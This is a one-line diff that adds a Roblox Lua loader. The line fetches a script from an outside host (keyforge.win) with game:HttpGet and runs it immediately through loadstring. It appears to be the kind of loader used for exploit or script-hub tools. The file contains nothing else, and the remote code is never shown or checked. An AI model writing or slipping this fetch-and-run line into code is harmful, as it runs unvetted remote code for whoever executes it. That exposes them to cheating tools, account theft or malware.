@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://www.keyforge.win/v1/loader/bootstrap/cmusvd1vg0f1xa8p4uy91ddnf", true))()
